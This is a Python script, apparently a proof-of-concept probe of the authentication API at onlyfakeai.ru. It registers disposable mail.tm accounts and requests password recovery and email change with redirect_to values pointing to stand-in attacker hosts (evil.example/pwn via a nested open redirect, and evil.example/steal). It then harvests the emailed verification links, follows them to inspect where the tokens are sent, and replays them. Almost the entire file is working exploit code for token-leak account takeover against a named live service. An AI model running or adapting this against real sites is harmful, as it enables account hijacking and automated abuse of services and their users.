import ssl, json, urllib.request, urllib.error, urllib.parse, sys, time, random, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
ctx = ssl.create_default_context()
KEY = "<publishable-key>"
SUPA = "https://cdn.onlyfakeai.ru"
MT = "https://api.mail.tm"

def req(method, url, body=None, token=None, extra=None, follow=True):
    h = {"User-Agent": "Mozilla/5.0", "Accept": "application/json", "Content-Type": "application/json"}
    if token: h["Authorization"] = f"Bearer {token}"
    if extra: h.update(extra)
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    class NoRedir(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k): return None
    opener = urllib.request.build_opener(urllib.request.HTTPRedirectHandler() if follow else NoRedir)
    try:
        with opener.open(r, timeout=30) as resp:
            return resp.status, dict(resp.headers), resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", "ignore")
    except Exception as e:
        return 0, {}, repr(e)

def mail_tm_account(tag):
    st, hd, b = req("GET", MT + "/domains")
    data = json.loads(b)
    members = data["hydra:member"] if isinstance(data, dict) else data
    domains = [d["domain"] for d in members]
    dom = domains[0]
    login = "authflow" + tag + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=5))
    addr = f"{login}@{dom}"
    pw = "Mx7#qL2!vB9$wR4"
    st, hd, b = req("POST", MT + "/accounts", {"address": addr, "password": pw})
    print("mail.tm account:", st, addr, b[:100])
    st, hd, b = req("POST", MT + "/token", {"address": addr, "password": pw})
    tok = json.loads(b).get("token") if st == 200 else None
    return addr, pw, tok

def mail_tm_messages(tok):
    st, hd, b = req("GET", MT + "/messages", token=tok)
    try:
        data = json.loads(b)
        if isinstance(data, dict):
            return data.get("hydra:member", [])
        return data if isinstance(data, list) else []
    except Exception:
        return []

def mail_tm_read(tok, mid):
    st, hd, b = req("GET", f"{MT}/messages/{mid}", token=tok)
    try:
        return json.loads(b)
    except Exception:
        return {}

def extract_links(m):
    parts = [m.get("text") or ""]
    html = m.get("html")
    if isinstance(html, list):
        parts.extend([h for h in html if isinstance(h, str)])
    elif isinstance(html, str):
        parts.append(html)
    txt = "\n".join(parts)
    return re.findall(r"https?://[^\s\"'<>\)]+", txt), txt

def wait_for_mail(tok, limit=14):
    for i in range(limit):
        time.sleep(3)
        msgs = mail_tm_messages(tok)
        if msgs:
            return msgs
    return []

def run_case(tag, redirect_to, do_email_change=False):
    print(f"\n########## CASE {tag} redirect_to={redirect_to} ##########")
    addr, pw, tok = mail_tm_account(tag)
    if not tok:
        return None
    st, hd, b = req("POST", SUPA + "/auth/v1/signup", {"email": addr, "password": pw}, extra={"apikey": KEY})
    print("signup:", st, b[:120])
    try:
        sess = json.loads(b)
    except Exception:
        sess = {}
    usertok = sess.get("access_token")
    if do_email_change:
        target = f"authflow-c{tag}@{addr.split('@')[1]}"
        st, hd, b = req("PUT", SUPA + "/auth/v1/user",
                        {"email": target, "redirect_to": redirect_to}, token=usertok, extra={"apikey": KEY})
        print("PUT /user email change:", st, b[:220])
    else:
        st, hd, b = req("POST", SUPA + "/auth/v1/recover",
                        {"email": addr, "redirect_to": redirect_to}, extra={"apikey": KEY})
        print("recover:", st, b[:120])
    msgs = wait_for_mail(tok)
    print("messages:", len(msgs))
    out = None
    for m in msgs[:2]:
        d = mail_tm_read(tok, m["id"]) or m
        print("  from:", d.get("from"), "| subject:", d.get("subject"))
        links, txt = extract_links(d)
        for u in links:
            print("  LINK:", u[:400])
        print("  text excerpt:", (d.get("text") or "")[:700].replace("\n", " "))
        out = links
    return out

# CASE A: recovery with nested apex open-redirect target
linksA = run_case("a", "https://onlyfakeai.ru/login?redirect=https%3A%2F%2Fevil.example%2Fpwn")
# CASE B: recovery with foreign redirect (expect fallback to site_url)
linksB = run_case("b", "https://evil.example/steal")

# click links
for name, links in (("A", linksA), ("B", linksB)):
    if not links:
        print(f"\nCASE {name}: no links")
        continue
    for u in links:
        if "auth/v1/verify" not in u and "token=" not in u:
            continue
        u = u.replace("&amp;", "&")
        print(f"\n== CASE {name} click ==")
        st, hd, b = req("GET", u, extra={"apikey": KEY}, follow=False)
        loc = hd.get("Location") or hd.get("location") or ""
        print("  status:", st, "Location:", loc[:600])
        st2, hd2, b2 = req("GET", u, extra={"apikey": KEY}, follow=False)
        print("  replay:", st2, b2[:200])
